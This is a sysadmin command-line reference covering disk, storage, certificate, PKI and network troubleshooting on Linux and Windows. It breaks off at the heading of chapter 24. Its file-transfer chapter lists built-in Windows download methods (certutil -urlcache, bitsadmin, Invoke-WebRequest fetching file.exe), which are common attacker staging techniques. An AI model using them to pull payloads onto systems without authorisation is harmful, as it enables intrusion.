---
title: 'Native Command-Line Reference'
category: 'Systems Administration'
---


<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Knowledge</div>
<h1 class="writeup-title"><strong>Native Command-Line Reference — No Installs</strong></h1>
</div>
</div>

<br />

<p class="lead mb-4">Living-off-the-land only — no <code>nmap</code>, no <code>nc</code> unless it's already there, no Metasploit (a handful of chapters flag a small, well-known one-time install where raw bash/stdlib genuinely can't get the job done — each says so inline). Everything else is stock on a default Linux or Windows box. Ordered as four parts — systems engineering, network engineering, blue teaming, then offensive security — so related commands sit together instead of being scattered by topic. Organized so you memorize the <em>pattern</em> (flags + pipe + grep), not just one command.</p>

<br />


<p class="col-label">Part I — Systems Engineering</p>


## 1. System Health, Certs, Time Sync & Account Policy {#ch1-system-health-certs-time-sync}

<p class="lead mb-4">The commands you'll actually run most days — disk full, service slow to boot, cert about to expire, "why did SELinux just eat my request," and the kernel/OOM internals behind a box that's quietly dying.</p>

```bash
# disk space - what's full, what's eating it
df -h
du -sh /* 2>/dev/null | sort -rh | head -20
find / -xdev -size +500M -type f 2>/dev/null -exec du -h {} \; | sort -rh | head -20

# memory & load
free -h
uptime
vmstat 1 5
cat /proc/loadavg

# what's chewing CPU/memory right now, sorted
ps auxww --sort=-%mem | head -15

# boot time breakdown — spot a slow/hanging service at startup
systemd-analyze blame 2>/dev/null | head -20
systemd-analyze critical-chain 2>/dev/null

# TLS cert expiry — catches outages before they happen
echo | openssl s_client -connect [Target_IP]:443 -servername [Target_IP] 2>/dev/null | openssl x509 -noout -enddate
for f in /etc/ssl/certs/*.pem; do openssl x509 -enddate -noout -in "$f" 2>/dev/null | sed "s|^|$f: |"; done

# clock sync — log correlation AND Kerberos both break on skew >5min
timedatectl status
chronyc tracking 2>/dev/null || ntpq -p 2>/dev/null

# SELinux / AppArmor — "why did that just get denied"
getenforce 2>/dev/null; sestatus 2>/dev/null
aa-status 2>/dev/null; cat /sys/module/apparmor/parameters/enabled 2>/dev/null

# kernel tuning — view and set live (survives until reboot; persist via /etc/sysctl.d/*.conf)
sysctl -a 2>/dev/null | grep -E 'net.ipv4.ip_forward|vm.swappiness|fs.file-max|net.core.somaxconn'
sysctl vm.swappiness=10                         # live change, no reboot
ulimit -a                                       # current shell's resource limits
cat /proc/sys/kernel/pid_max

# OOM killer — what got killed and why
dmesg -T | grep -i 'out of memory\|oom'
journalctl -k | grep -i oom 2>/dev/null
cat /proc/<pid>/oom_score                       # higher = more likely to be killed first

# iostat/mpstat need the sysstat package — not default on minimal installs; native fallback:
cat /proc/diskstats
awk '{print $1" "$5}' /proc/loadavg             # 1-min load vs running/total process count

# account policy & aging — stale or never-expiring passwords
chage -l <username>
passwd -S <username> 2>/dev/null
```

```powershell
# disk, memory — Windows side
Get-PSDrive -PSProvider FileSystem
Get-CimInstance Win32_LogicalDisk | select DeviceID, @{n='FreeGB';e={[math]::Round($_.FreeSpace/1GB,1)}}, @{n='SizeGB';e={[math]::Round($_.Size/1GB,1)}}
Get-CimInstance Win32_OperatingSystem | select @{n='FreeMemGB';e={[math]::Round($_.FreePhysicalMemory/1MB,1)}}, @{n='TotalMemGB';e={[math]::Round($_.TotalVisibleMemorySize/1MB,1)}}

# certificate store + expiry
Get-ChildItem Cert:\LocalMachine\My | select Subject, NotAfter
certutil -store My

# time sync
w32tm /query /status

# account policy
net accounts
Get-LocalUser | select Name, PasswordExpires, PasswordLastSet
```

<br />


## 2. Moving Files Without scp/rsync {#ch2-moving-files}

<p class="lead mb-4">Transfer options when the usual tools aren't on the path — HTTP serving, raw tar-over-ssh, base64 through a copy-paste channel, and the Windows-native equivalents.</p>

```bash
# --- serve a directory over HTTP, stdlib only ---
python3 -m http.server 8000
# pull it down elsewhere
curl -O http://[Target_IP]:8000/file.tar.gz
wget http://[Target_IP]:8000/file.tar.gz

# --- rsync, if present on both ends (resumable, preserves perms) ---
rsync -avz --progress file.tar.gz user@[Target_IP]:/dest/

# --- tar straight over an existing ssh session, no temp file ---
tar czf - /path/to/dir | ssh user@[Target_IP] 'tar xzf - -C /dest'

# --- text-safe transfer through a copy-paste channel ---
base64 -w0 file.bin > file.b64          # encode on source
base64 -d file.b64 > file.bin           # decode on destination

# --- Windows side, no extra tools ---
certutil -encode file.bin file.b64
certutil -decode file.b64 file.bin
certutil -urlcache -split -f http://[Target_IP]:8000/file.exe out.exe
powershell -c "Invoke-WebRequest -Uri http://[Target_IP]:8000/file.exe -OutFile out.exe"
bitsadmin /transfer job /download /priority high http://[Target_IP]:8000/file.exe C:\out.exe
Copy-Item file.bin \\[Target_IP]\share\file.bin   # if the UNC path is already reachable

# --- integrity check after any transfer ---
sha256sum file.bin           # Linux
Get-FileHash file.bin -Algorithm SHA256   # Windows
```

<br />


## 3. Containers & Kubernetes Quick Triage {#ch3-containers-kubernetes-triage}

<p class="lead mb-4">If any of your infra runs on this, it's your most common "something's broken, check it" task — and none of it is covered above.</p>

```bash
# --- Docker ---
docker ps -a
docker logs --tail 100 -f <container>
docker inspect <container> | jq '.[0].Config.Env, .[0].NetworkSettings.Ports' 2>/dev/null
docker exec -it <container> sh
docker stats --no-stream
docker system df                      # disk usage by images/containers/volumes

# --- Kubernetes ---
kubectl get pods -A
kubectl describe pod <pod> -n <ns>
kubectl logs <pod> -n <ns> --previous          # crashed container's last logs before restart
kubectl get events -A --sort-by=.lastTimestamp
kubectl exec -it <pod> -n <ns> -- sh
kubectl top pods -A 2>/dev/null                # needs metrics-server
kubectl get pods -A -o wide | grep -v Running  # anything not healthy, at a glance
```

<br />


## 4. Disk Discovery & Partitioning {#ch4-disk-discovery-partitioning}

<p class="lead mb-4">Everything here runs on a default Linux/Windows server install except where flagged. <code>smartctl</code> needs <code>smartmontools</code>, which is near-universal on servers but not guaranteed on a minimal image.</p>

```bash
# what disks/partitions exist, at a glance
lsblk -f
lsblk -o NAME,SIZE,FSTYPE,MOUNTPOINT,UUID

# low-level disk info — model, serial, SMART-capable
cat /sys/block/sda/device/model
blkid                                   # UUID + filesystem type per partition

# partition table — view and edit, both MBR and GPT
fdisk -l /dev/sda
parted /dev/sda print

# interactive partitioning (fdisk for MBR/simple GPT, parted for anything bigger)
fdisk /dev/sdb                          # n (new), p (primary), w (write) — classic flow
parted /dev/sdb mklabel gpt
parted /dev/sdb mkpart primary ext4 0% 100%

# does the kernel even see the disk? (useful after hot-plug or SAN LUN changes)
echo 1 > /sys/class/scsi_host/host0/scan    # rescan SCSI bus without reboot
cat /proc/partitions

# disk health (SMART) — smartctl itself needs smartmontools installed, but is near-universal on servers
smartctl -H /dev/sda 2>/dev/null
```

<br />


## 5. Filesystem Creation, Mounting & fstab {#ch5-filesystem-creation-mounting-fstab}

<p class="lead mb-4">Creating, mounting, persisting, and cleanly tearing down a filesystem — the mount options and fstab gotchas that matter in practice.</p>

```bash
# create a filesystem — pick the type that matches the use case
mkfs.ext4 /dev/sdb1
mkfs.xfs /dev/sdb1                      # better for large files / high-throughput workloads

# mount, with options that matter in practice
mount -o noatime,nodiratime /dev/sdb1 /mnt/data    # skip access-time writes — real I/O win on busy filesystems
mount -o ro /dev/sdb1 /mnt/recovery                # read-only, for evidence/recovery work

# persist across reboot — fstab, by UUID not device name (device names shift)
blkid /dev/sdb1                          # get the UUID first
echo 'UUID=<uuid>  /mnt/data  ext4  defaults,noatime  0  2' >> /etc/fstab
mount -a                                 # test fstab without rebooting; fails loudly if the line is wrong

# what's actually mounted right now, vs what fstab says should be
mount | column -t
findmnt --verify                        # cross-checks fstab against reality, flags mismatches

# bind mount — expose one directory at a second path, same underlying data
mount --bind /var/www /srv/webroot

# unmount cleanly, or force when a process is holding it open
umount /mnt/data
fuser -vm /mnt/data                      # see what's holding it open before you force anything
umount -l /mnt/data                      # lazy unmount — detaches now, cleans up once nothing's using it
```

<br />


## 6. LVM {#ch6-lvm}

<p class="lead mb-4"><code>lvm2</code> ships pre-installed on nearly every server-oriented distro (RHEL/Ubuntu Server). The three layers — physical volume, volume group, logical volume — and the single most useful day-to-day operation: extending a volume live.</p>

```bash
# the three layers: physical volume -> volume group -> logical volume
pvcreate /dev/sdb1
vgcreate data_vg /dev/sdb1
lvcreate -L 50G -n app_lv data_vg
mkfs.xfs /dev/data_vg/app_lv
mount /dev/data_vg/app_lv /mnt/app

# inspect each layer
pvs; vgs; lvs
pvdisplay; vgdisplay; lvdisplay           # verbose versions

# extend a logical volume live, no downtime — the single most useful LVM operation day to day
lvextend -L +20G /dev/data_vg/app_lv
resize2fs /dev/data_vg/app_lv             # ext4 — grow the filesystem to match
xfs_growfs /mnt/app                       # xfs — note: mountpoint, not device, and xfs can only grow

# add a new disk to an existing volume group
vgextend data_vg /dev/sdc1

# LVM snapshots — point-in-time copy, useful before a risky change
lvcreate -L 5G -s -n app_lv_snap /dev/data_vg/app_lv
mount -o ro /dev/data_vg/app_lv_snap /mnt/snap
lvremove /dev/data_vg/app_lv_snap          # clean up once done

# what's the volume group's free space, before you promise someone an extend
vgs -o vg_name,vg_free
```

<br />


## 7. Software RAID with mdadm {#ch7-software-raid-mdadm}

<p class="lead mb-4"><code>mdadm</code> is standard on bare-metal RAID boxes but often needs installing on minimal/cloud images — flagged inline.</p>

```bash
# one-time install if missing
sudo apt install mdadm -y

# create an array — RAID1 (mirror) across two disks
mdadm --create /dev/md0 --level=1 --raid-devices=2 /dev/sdb1 /dev/sdc1
mkfs.ext4 /dev/md0

# check array status and health — the command you'll run most
cat /proc/mdstat
mdadm --detail /dev/md0

# a disk failed — replace it
mdadm --manage /dev/md0 --fail /dev/sdb1 --remove /dev/sdb1
mdadm --manage /dev/md0 --add /dev/sdd1            # new disk, same size or larger
cat /proc/mdstat                                    # watch the rebuild progress

# persist the array config across reboot
mdadm --detail --scan >> /etc/mdadm/mdadm.conf
update-initramfs -u

# simulate a failure in a lab, to test your own runbook before you need it for real
mdadm --manage /dev/md0 --fail /dev/sdc1
```

<br />


## 8. Disk I/O Performance Diagnosis {#ch8-disk-io-performance-diagnosis}

<p class="lead mb-4">Finding which process or disk is actually the bottleneck — all without the <code>sysstat</code> package.</p>

```bash
# native, no sysstat package needed
cat /proc/diskstats
awk '{print $3, $4, $8}' /proc/diskstats    # device, reads completed, writes completed

# per-process disk I/O — which process is actually hammering the disk
iotop -o 2>/dev/null                        # needs install; native fallback below
for p in /proc/[0-9]*/io; do echo "$p: $(grep -E 'read_bytes|write_bytes' $p 2>/dev/null | tr '\n' ' ')"; done | sort -t: -k2 -rn | head -10

# raw throughput benchmark — write then read, sequential
dd if=/dev/zero of=/mnt/data/testfile bs=1M count=1024 oflag=direct status=progress
dd if=/mnt/data/testfile of=/dev/null bs=1M iflag=direct status=progress
rm /mnt/data/testfile

# is this disk an SSD or spinning rust? changes what "good" latency looks like
cat /sys/block/sda/queue/rotational         # 0 = SSD, 1 = HDD

# current I/O scheduler, and how to change it live
cat /sys/block/sda/queue/scheduler
echo mq-deadline > /sys/block/sda/queue/scheduler

# filesystem-level cache pressure
cat /proc/meminfo | grep -i dirty            # dirty pages waiting to be flushed to disk
```

<br />


## 9. Filesystem Integrity & Repair {#ch9-filesystem-integrity-repair}

<p class="lead mb-4">Checking and repairing a filesystem the right way — unmounted, with the correct tool per filesystem type.</p>

```bash
# check (unmounted — never fsck a mounted filesystem)
umount /dev/sdb1
fsck -f /dev/sdb1                          # ext2/3/4
xfs_repair /dev/sdb1                       # xfs — note: no -f flag needed, and must be unmounted

# schedule a check on next boot for the root filesystem (can't unmount root live)
touch /forcefsck                           # legacy method, still works on many distros

# bad sector scan — slow, but definitive
badblocks -v /dev/sdb1

# ext4 tunables — check/set max mount count, reserved blocks, last check date
tune2fs -l /dev/sdb1
tune2fs -c 0 -i 0 /dev/sdb1                # disable forced periodic fsck (common on servers where downtime is costly)

# verify a filesystem's UUID/label without mounting
blkid /dev/sdb1
e2label /dev/sdb1 new-label
```

```powershell
# Windows equivalent
chkdsk C: /f /r                            # needs a reboot for the system volume
Repair-Volume -DriveLetter D -Scan
Get-Volume | Select DriveLetter, FileSystemType, HealthStatus
```

<br />


## 10. Disk Usage, Quotas & Finding What's Eating Space {#ch10-disk-usage-quotas}

<p class="lead mb-4">The "disk full" page triage — biggest consumers, deleted-but-open files, per-user quotas, and the log directory that's usually the actual culprit.</p>

```bash
# top-level usage breakdown, biggest first
du -sh /* 2>/dev/null | sort -rh | head -20

# biggest individual files system-wide
find / -xdev -type f -size +1G 2>/dev/null -exec ls -lh {} \; | sort -k5 -rh

# deleted-but-still-open files — classic "df says full, du says fine" mismatch
lsof +L1 2>/dev/null | grep deleted

# per-user disk quota — view and set (needs quota tooling enabled on the filesystem)
quota -u <username>
repquota -a                                 # all users, all quota-enabled filesystems
setquota -u <username> 10G 12G 0 0 /home    # soft 10G, hard 12G

# log directory specifically — often the actual culprit on a "disk full" page
du -sh /var/log/* 2>/dev/null | sort -rh | head -10
journalctl --disk-usage
journalctl --vacuum-size=500M               # trim the journal down live
```

<br />


## 11. Windows Storage Management {#ch11-windows-storage-management}

<p class="lead mb-4">Disk/volume inventory, initializing and resizing, Storage Spaces, and the legacy cmd.exe-era tools that are still native.</p>

```powershell
# disk/volume/partition inventory
Get-Disk
Get-Partition
Get-Volume | Select DriveLetter, FileSystemLabel, FileSystemType, @{n='FreeGB';e={[math]::Round($_.SizeRemaining/1GB,1)}}, @{n='SizeGB';e={[math]::Round($_.Size/1GB,1)}}

# initialize and partition a new disk
Initialize-Disk -Number 1 -PartitionStyle GPT
New-Partition -DiskNumber 1 -UseMaximumSize -AssignDriveLetter
Format-Volume -DriveLetter E -FileSystem NTFS -NewFileSystemLabel "Data"

# resize a volume live — extend into adjacent free space
Get-PartitionSupportedSize -DriveLetter D          # what's the max you can grow to
Resize-Partition -DriveLetter D -Size <bytes>

# Storage Spaces (Windows' software RAID equivalent)
Get-StoragePool
Get-VirtualDisk
New-StoragePool -FriendlyName "Pool1" -StorageSubsystemFriendlyName "Windows Storage*" -PhysicalDisks (Get-PhysicalDisk -CanPool $true)

# what's eating space — biggest folders
Get-ChildItem C:\ -Directory | ForEach-Object {
  [PSCustomObject]@{Name=$_.Name; SizeGB=[math]::Round((Get-ChildItem $_.FullName -Recurse -ErrorAction SilentlyContinue | Measure-Object Length -Sum).Sum/1GB,2)}
} | Sort-Object SizeGB -Descending

# diskpart — the cmd.exe-era equivalent, scriptable
diskpart /s diskpart-script.txt
```

```cmd
:: legacy cmd.exe disk tools, still native
wmic logicaldisk get caption,freespace,size
fsutil volume diskfree C:
```

<br />


## 12. Network Storage: NFS & SMB {#ch12-network-storage-nfs-smb}

<p class="lead mb-4">Mounting, exporting, and health-checking the two network filesystems that show up on almost every mixed environment.</p>

```bash
# --- NFS ---
showmount -e [Target_IP]                    # what's exported
mount -t nfs [Target_IP]:/export/data /mnt/nfs
cat /etc/exports                             # if this box is the server
exportfs -ra                                 # re-read exports without restarting nfs-server

# NFS mount health — stuck mounts are a classic "server is slow" symptom
nfsstat -c
cat /proc/mounts | grep nfs

# --- SMB ---
mount -t cifs //[Target_IP]/share /mnt/smb -o username=<user>,password=<pass>,vers=3.0
smbclient -L //[Target_IP]/ -U <user>
smbclient //[Target_IP]/share -U <user>
```

```powershell
# Windows side
Net-Use Z: \\[Target_IP]\share /user:<user>
Get-SmbShare                                  # shares hosted FROM this box
Get-SmbMapping                                # shares mounted TO this box
Test-NetConnection -ComputerName [Target_IP] -Port 445
```

<br />


## 13. ZFS Basics {#ch13-zfs-basics}

<p class="lead mb-4">Not native — needs <code>zfsutils-linux</code>/OpenZFS installed — included because it's common on real storage boxes and merges the RAID + volume-manager + filesystem layers that LVM/mdadm split apart.</p>

```bash
# one-time install (Debian/Ubuntu)
sudo apt install zfsutils-linux -y

# pool creation and status — ZFS merges the RAID + volume manager + filesystem layers LVM/mdadm split apart
zpool create data_pool mirror /dev/sdb /dev/sdc
zpool status
zpool list

# datasets — ZFS's equivalent of a logical volume, but cheap and nestable
zfs create data_pool/app
zfs list
zfs set quota=50G data_pool/app
zfs set compression=lz4 data_pool/app         # near-free, on by default being worth turning on if it isn't

# snapshots — cheap, instant, and the reason people pick ZFS in the first place
zfs snapshot data_pool/app@before-upgrade
zfs list -t snapshot
zfs rollback data_pool/app@before-upgrade

# scrub — integrity check across the whole pool, run it periodically
zpool scrub data_pool
zpool status -v                               # shows scrub progress and any detected errors
```

<br />


## 14. Generating Keys & CSRs {#ch14-generating-keys-csrs}

<p class="lead mb-4"><code>openssl</code> is as close to universal as any CLI tool gets — standard on every Linux distro and present on modern Windows too. Nothing in this chapter needs an install.</p>

```bash
# RSA private key
openssl genrsa -out server.key 2048
openssl genrsa -aes256 -out server.key 2048          # password-protected

# EC key — smaller, faster, modern default
openssl ecparam -genkey -name prime256v1 -out server.key

# CSR from an existing key — interactive prompts for subject fields
openssl req -new -key server.key -out server.csr

# CSR non-interactively, one line, with SANs (required by every modern browser/client)
openssl req -new -key server.key -out server.csr -subj "/C=US/ST=State/L=City/O=Org/CN=app.example.com" \
  -addext "subjectAltName=DNS:app.example.com,DNS:www.app.example.com,IP:[Target_IP]"

# key + CSR in one step
openssl req -new -newkey rsa:2048 -nodes -keyout server.key -out server.csr -subj "/CN=app.example.com"

# verify a CSR's contents before submitting it to a CA
openssl req -in server.csr -noout -text

# confirm a key and CSR actually match (common mistake: wrong key sent with a CSR)
openssl req -noout -modulus -in server.csr | openssl md5
openssl rsa -noout -modulus -in server.key | openssl md5   # hashes must match
```

<br />


## 15. Building a Private CA {#ch15-building-a-private-ca}

<p class="lead mb-4">Lab/internal PKI — root CA, intermediate CA, and signing leaf certs. Keep the root key offline/air-gapped in anything resembling production.</p>

```bash
# --- root CA (keep this key offline/air-gapped in anything resembling production) ---
openssl genrsa -out root-ca.key 4096
openssl req -x509 -new -nodes -key root-ca.key -sha256 -days 3650 \
  -subj "/CN=Internal Root CA/O=YourOrg" -out root-ca.crt

# --- intermediate CA (this is what actually signs leaf certs day to day) ---
openssl genrsa -out intermediate.key 4096
openssl req -new -key intermediate.key -subj "/CN=Internal Intermediate CA/O=YourOrg" -out intermediate.csr
openssl x509 -req -in intermediate.csr -CA root-ca.crt -CAkey root-ca.key -CAcreateserial \
  -out intermediate.crt -days 1825 -sha256 -extfile <(echo "basicConstraints=CA:TRUE")

# --- sign a leaf/server cert with the intermediate ---
openssl x509 -req -in server.csr -CA intermediate.crt -CAkey intermediate.key -CAcreateserial \
  -out server.crt -days 365 -sha256 \
  -extfile <(printf "subjectAltName=DNS:app.example.com,IP:[Target_IP]\nbasicConstraints=CA:FALSE\nkeyUsage=digitalSignature,keyEncipherment")

# build the full chain file clients need (leaf first, then intermediate — order matters)
cat server.crt intermediate.crt > server-fullchain.crt

# revoke a cert and generate a CRL (basic — no real revocation infra without a CRL distribution point)
openssl ca -revoke server.crt -keyfile intermediate.key -cert intermediate.crt
openssl ca -gencrl -keyfile intermediate.key -cert intermediate.crt -out intermediate.crl
```

<br />


## 16. Inspecting Certs & Chains {#ch16-inspecting-certs-chains}

<p class="lead mb-4">Reading a certificate's fields, pulling one straight off a live server, and confirming a private key actually matches it.</p>

```bash
# full human-readable dump — subject, issuer, SANs, validity, extensions, public key
openssl x509 -in server.crt -noout -text

# just the fields you usually actually need
openssl x509 -in server.crt -noout -subject -issuer -dates -fingerprint -sha256
openssl x509 -in server.crt -noout -ext subjectAltName          # SANs only

# verify a cert against a chain/CA bundle
openssl verify -CAfile root-ca.crt -untrusted intermediate.crt server.crt

# pull the cert straight off a live server, no file needed
echo | openssl s_client -connect [Target_IP]:443 -servername [Target_IP] 2>/dev/null | openssl x509 -noout -text

# full chain as the server actually sends it — catches "missing intermediate" misconfigs
openssl s_client -connect [Target_IP]:443 -showcerts </dev/null 2>/dev/null

# does the private key actually belong to this cert? (same modulus-match trick as the CSR check)
openssl x509 -noout -modulus -in server.crt | openssl md5
openssl rsa -noout -modulus -in server.key | openssl md5
```

<br />


## 17. Converting Between Certificate Formats {#ch17-converting-certificate-formats}

<p class="lead mb-4">PEM, DER, PKCS12 and PKCS7 — the conversions that come up whenever a cert has to move between OpenSSL, Windows, and Java tooling.</p>

```bash
# PEM -> DER (binary) — some Windows/Java tooling wants this
openssl x509 -in server.crt -outform der -out server.der

# DER -> PEM
openssl x509 -in server.der -inform der -outform pem -out server.crt

# PEM cert + key -> PKCS12 (.pfx/.p12) — what Windows cert store and most GUI tools import
openssl pkcs12 -export -out server.pfx -inkey server.key -in server.crt -certfile intermediate.crt

# PKCS12 -> PEM (extract key and cert back out)
openssl pkcs12 -in server.pfx -nocerts -nodes -out server.key
openssl pkcs12 -in server.pfx -clcerts -nokeys -out server.crt

# PKCS7 (.p7b, common from Microsoft CAs) -> PEM
openssl pkcs7 -print_certs -in chain.p7b -out chain.pem

# PEM chain -> PKCS7
openssl crl2pkcs7 -nocrl -certfile server-fullchain.crt -out chain.p7b
```

<br />


## 18. Checking Expiry & Renewal {#ch18-checking-expiry-renewal}

<p class="lead mb-4">Scriptable expiry checks against a file or a live endpoint, sweeping a whole directory, and the Windows side.</p>

```bash
# days until expiry, straight from a local file
openssl x509 -enddate -noout -in server.crt

# same, against a live endpoint
echo | openssl s_client -connect [Target_IP]:443 -servername [Target_IP] 2>/dev/null | openssl x509 -noout -enddate

# will it still be valid N days from now? exits non-zero if it expires within the window — scriptable for monitoring
openssl x509 -checkend 2592000 -noout -in server.crt && echo "valid for 30+ more days" || echo "EXPIRING within 30 days"

# sweep every cert in a directory and flag anything expiring soon
for f in /etc/ssl/certs/*.pem; do
  openssl x509 -checkend 2592000 -noout -in "$f" >/dev/null 2>&1 || echo "EXPIRING SOON: $f"
done

# Let's Encrypt renewal (certbot itself needs installing, but is the de facto standard)
certbot renew --dry-run                        # test without actually renewing
certbot certificates                            # list what's managed and when each expires
```

```powershell
# Windows cert store, sorted by expiry
Get-ChildItem Cert:\LocalMachine\My | Sort-Object NotAfter | Select Subject, NotAfter
Get-ChildItem Cert:\LocalMachine\My | Where-Object { $_.NotAfter -lt (Get-Date).AddDays(30) }   # expiring within 30 days
```

<br />


## 19. TLS Endpoint Testing: Ciphers, Protocols, OCSP/CRL {#ch19-tls-endpoint-testing}

<p class="lead mb-4">Which protocol versions and ciphers a server actually accepts, live revocation checks, and handshake timing.</p>

```bash
# which protocol versions does the server accept — test each explicitly
for ver in ssl3 tls1 tls1_1 tls1_2 tls1_3; do
  echo -n "$ver: "; openssl s_client -connect [Target_IP]:443 -$ver </dev/null 2>&1 | grep -q 'Cipher is' && echo accepted || echo rejected
done

# list all ciphers this openssl build supports, then test which the server actually accepts
openssl ciphers -v 'ALL' | awk '{print $1}' | while read c; do
  openssl s_client -connect [Target_IP]:443 -cipher "$c" </dev/null 2>&1 | grep -q 'Cipher is' && echo "accepted: $c"
done

# OCSP — is the cert revoked? (live check against the issuer's responder)
openssl x509 -in server.crt -noout -ocsp_uri
openssl ocsp -issuer intermediate.crt -cert server.crt -url <ocsp-uri-from-above> -resp_text

# CRL — pull and inspect
openssl crl -in intermediate.crl -noout -text

# full handshake timing — useful for "TLS is slow" complaints
time (echo | openssl s_client -connect [Target_IP]:443 2>/dev/null >/dev/null)
```

<br />


## 20. Windows Certificate Store & PKI Tools {#ch20-windows-certificate-store-pki-tools}

<p class="lead mb-4">Browsing and managing the Windows cert store, importing/exporting, trusting an internal CA, and requesting a cert the Windows-native way.</p>

```powershell
# browse the store
Get-ChildItem Cert:\LocalMachine\My
Get-ChildItem Cert:\LocalMachine\Root            # trusted root CAs
Get-ChildItem Cert:\CurrentUser\My

# import / export
Import-PfxCertificate -FilePath server.pfx -CertStoreLocation Cert:\LocalMachine\My -Password (ConvertTo-SecureString -String "pass" -AsPlainText -Force)
Export-PfxCertificate -Cert Cert:\LocalMachine\My\<thumbprint> -FilePath export.pfx -Password (ConvertTo-SecureString -String "pass" -AsPlainText -Force)
Export-Certificate -Cert Cert:\LocalMachine\My\<thumbprint> -FilePath export.cer

# trust a CA cert on this machine (adds to the local trust store)
Import-Certificate -FilePath root-ca.crt -CertStoreLocation Cert:\LocalMachine\Root

# generate a CSR the Windows way (works against an internal Microsoft CA)
$inf = @"
[NewRequest]
Subject = "CN=app.example.com"
KeyLength = 2048
Exportable = TRUE
"@
$inf | Out-File request.inf
certreq -new request.inf request.csr
certreq -submit request.csr                       # submit to a reachable enterprise CA
certreq -accept certnew.cer                        # install the signed cert once returned

# certutil — the cmd.exe-era equivalent, still the fastest way to dump a cert
certutil -dump server.crt
certutil -verify server.crt
certutil -store My                                 # list the personal store
```

<br />


## 21. Troubleshooting Chain & Trust Errors {#ch21-troubleshooting-chain-trust-errors}

<p class="lead mb-4">The errors that show up most — missing intermediate, hostname mismatch, clock skew masquerading as expiry, and spotting a self-signed cert where it shouldn't be.</p>

```bash
# "unable to get local issuer certificate" — almost always a missing intermediate on the server side
openssl s_client -connect [Target_IP]:443 -showcerts </dev/null 2>&1 | grep -c 'BEGIN CERTIFICATE'
# 1 cert returned = leaf only, no intermediate sent — that's the bug; fix: concat leaf+intermediate server-side

# confirm the chain actually validates once you have all the pieces
openssl verify -CAfile root-ca.crt -untrusted intermediate.crt server.crt

# hostname mismatch — does the cert actually cover the name being requested?
openssl x509 -in server.crt -noout -ext subjectAltName
# compare against the Host/SNI you're actually connecting with

# "certificate has expired" vs "not yet valid" — check clock skew first, it's a common false alarm
date -u; openssl x509 -in server.crt -noout -dates
timedatectl status                                  # confirm the client's own clock is correct

# self-signed cert in the chain where it shouldn't be — spot it fast
openssl x509 -in server.crt -noout -issuer -subject
# issuer == subject means self-signed; fine for a root CA, a red flag for a leaf cert in production

# weak key/signature algorithm — flagged by modern clients and scanners alike
openssl x509 -in server.crt -noout -text | grep -E 'Public-Key|Signature Algorithm'
```

```powershell
# Windows-side chain validation, with full detail on exactly where it breaks
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2("server.crt")
$chain = New-Object System.Security.Cryptography.X509Certificates.X509Chain
$chain.Build($cert)
$chain.ChainStatus   # empty = valid chain; otherwise names the exact failure (Revoked, NotTimeValid, UntrustedRoot, etc.)
```

<br />

<br />

<br />


<p class="col-label">Part II — Network Engineering</p>


## 22. Network Troubleshooting & Engineering (Linux) {#ch22-network-troubleshooting}

<p class="lead mb-4">Diagnosing connectivity, reachability, and traffic shape using only what ships on the box.</p>

```bash
# interfaces, routes, ARP/neighbor table
ip a; ip r; ip neigh

# socket state — your netstat replacement
ss -tulnp          # listening
ss -tanp state established
ss -s               # summary counts

# TCP-mode traceroute (passes ICMP-blocking firewalls)
traceroute -T -p 80 [Target_IP]

# DNS without dig/host present
getent hosts [Target_IP]
python3 -c "import socket; print(socket.gethostbyname('[Target_IP]'))"

# TCP connect check with only bash — confirm a port is reachable
timeout 1 bash -c 'cat < /dev/null > /dev/tcp/[Target_IP]/443' && echo open || echo closed

# HTTP / TLS banner grab — headers, server string, cert CN often name the vendor
curl -skI http://[Target_IP]
curl -skI https://[Target_IP]
openssl s_client -connect [Target_IP]:443 -servername [Target_IP] </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer

# MTU / path MTU discovery
ping -M do -s 1472 -c 2 [Target_IP]

# interface link stats and state — drops/errors visible without ethtool
ip -s link show
cat /sys/class/net/eth0/operstate 2>/dev/null

# bonding / VLAN info, if present
cat /proc/net/bonding/bond0 2>/dev/null
ip -d link show | grep -i vlan

# NAT/connection-tracking table — if THIS box is the gateway, this is how you'd find the real client behind a NATed IP
conntrack -L 2>/dev/null | grep [Target_IP]
cat /proc/net/nf_conntrack 2>/dev/null | grep [Target_IP]

# firewall rules in force
iptables -L -n -v --line-numbers; iptables-save

# live bandwidth without a tool
watch -n1 'cat /proc/net/dev | column -t'

# which route a packet to X takes
ip route get [Target_IP]
```

<br />


## 23. tcpdump — Advanced Filters {#ch23-tcpdump-advanced-filters}

<p class="lead mb-4">BPF filter patterns worth memorizing — scan detection, protocol isolation, rotating long captures, and reading a pcap back from disk.</p>

```bash
# full capture to disk, snaplen 0 (no truncation), any interface
tcpdump -i any -nn -s0 -w capture.pcap

# read it back, filtered
tcpdump -nn -r capture.pcap host [Target_IP] and port 443

# only SYN packets (connection attempts — great for seeing scan activity)
tcpdump -i eth0 -nn 'tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) = 0'

# only SYN-ACK (confirms a port actually answered)
tcpdump -i eth0 -nn 'tcp[tcpflags] == (tcp-syn|tcp-ack)'

# RST packets (refused connections / torn-down sessions)
tcpdump -i eth0 -nn 'tcp[tcpflags] & tcp-rst != 0'

# ASCII payload view, useful for cleartext protocol inspection
tcpdump -A -s0 -i eth0 port 80 or port 23

# host + port + direction combined
tcpdump -i eth0 -nn 'src host [Target_IP] and dst port 445'

# traffic NOT to/from a noisy host (exclude your own monitoring box)
tcpdump -i eth0 -nn 'not host [Monitoring_IP]'

# ICMP only — useful when chasing ping/traceroute noise or ICMP tunneling
tcpdump -i eth0 -nn icmp

# DNS queries only — spot beaconing or odd lookups
tcpdump -i eth0 -nn -s0 'udp port 53'

# ARP traffic — spoofing/poisoning detection
tcpdump -i eth0 -nn arp

# VLAN-tagged frames
tcpdump -i eth0 -nn vlan

# hex + ASCII dump of the first N packets — inspect exact bytes
tcpdump -XX -s0 -c 20 -i eth0 port 80

# rotating capture files for long unattended runs (new file hourly, cap at 100 files)
tcpdump -i eth0 -w 'capture-%Y%m%d-%H%M.pcap' -G 3600 -C 100 -W 100

# count packets per host without reading payload (quick anomaly check)
tcpdump -nn -r capture.pcap | awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c | sort -rn | head
```

<br />


## 24. Identifying the Device Behind an IP {#ch24-identifying-device-behind-ip}

